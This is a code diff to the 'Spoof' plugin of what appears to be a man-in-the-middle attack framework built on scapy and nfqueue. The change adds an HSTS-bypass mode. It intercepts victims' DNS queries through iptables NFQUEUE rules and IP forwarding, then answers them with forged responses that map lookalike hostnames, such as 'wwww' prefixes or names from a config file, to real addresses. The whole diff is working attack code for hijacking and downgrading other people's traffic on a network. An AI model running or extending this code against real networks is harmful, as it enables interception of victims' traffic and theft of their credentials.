@@ -6,6 +6,7 @@ from twisted.internet import reactor
 from twisted.internet.interfaces import IReadDescriptor
 from plugins.plugin import Plugin
 from time import sleep
+import dns.resolver
 import nfqueue
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
@@ -45,6 +46,8 @@ class Spoof(Plugin):
         self.target = options.target
         self.arpmode = options.arpmode
         self.port = options.listen
+        self.hsts = options.hsts
+        self.hstscfg = "./config_files/hsts_bypass.cfg"
         self.manualiptables = options.manualiptables  #added by alexander.georgiev@daloo.de
         self.debug = False
         self.send = True
@@ -91,12 +94,17 @@ class Spoof(Plugin):
         else:
             sys.exit("[-] Spoof plugin requires --arp, --icmp or --dhcp")
 
-        if self.dns:
+        if (self.dns or self.hsts):
             print "[*] DNS Tampering enabled"
-            self.dnscfg = ConfigObj(self.dnscfg)
+            
+            if self.dns:
+                self.dnscfg = ConfigObj(self.dnscfg)
+
+            self.hstscfg = ConfigObj(self.hstscfg)
 
             if not self.manualiptables:
                 os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
+            
             self.start_dns_queue()
 
         file = open('/proc/sys/net/ipv4/ip_forward', 'w')
@@ -225,27 +233,53 @@ class Spoof(Plugin):
 
         return pkt
 
+    def resolve_domain(self, domain):
+        try:
+            answer = dns.resolver.query(domain, 'A')
+            real_ips = []
+            for rdata in answer:
+                real_ips.append(rdata.address)
+
+            if len(real_ips) > 0:
+                return real_ips[0]
+
+        except Exception:
+            logging.debug("Error resolving " + domain)
+
     def nfqueue_callback(self, i, payload):
         data = payload.get_data()
         pkt = IP(data)
         if not pkt.haslayer(DNSQR):
             payload.set_verdict(nfqueue.NF_ACCEPT)
         else:
-            if self.dnscfg:
+            if self.dns:
                 for k, v in self.dnscfg.items():
-                    if k in pkt[DNS].qd.qname:
+                    if k in pkt[DNSQR].qname:
                         self.modify_dns(payload, pkt, v)
 
-            elif self.domain in pkt[DNS].qd.qname:
-                self.modify_dns(payload, pkt, self.dnsip)
+            elif self.hsts:
+                if (pkt[DNSQR].qtype is 28 or pkt[DNSQR].qtype is 1):
+                    for k,v in self.hstscfg.items():
+                        if v == pkt[DNSQR].qname[:-1]:
+                            ip = self.resolve_domain(k)
+                            if ip:
+                                self.modify_dns(payload, pkt, ip, hsts=True)
+                    
+                    if 'wwww' in pkt[DNSQR].qname:
+                        ip = self.resolve_domain(pkt[DNSQR].qname[1:-1])
+                        if ip:
+                            self.modify_dns(payload, pkt, ip, hsts=True)
 
-    def modify_dns(self, payload, pkt, ip):
+    def modify_dns(self, payload, pkt, ip, hsts=False):
         spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
                       UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=ip))
 
         payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
-        logging.info("%s Modified DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
+        if hsts:
+            logging.info("%s Resolving %s for HSTS bypass" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
+        else:
+            logging.info("%s Modified DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
 
     def start_dns_queue(self):
         self.q = nfqueue.queue()
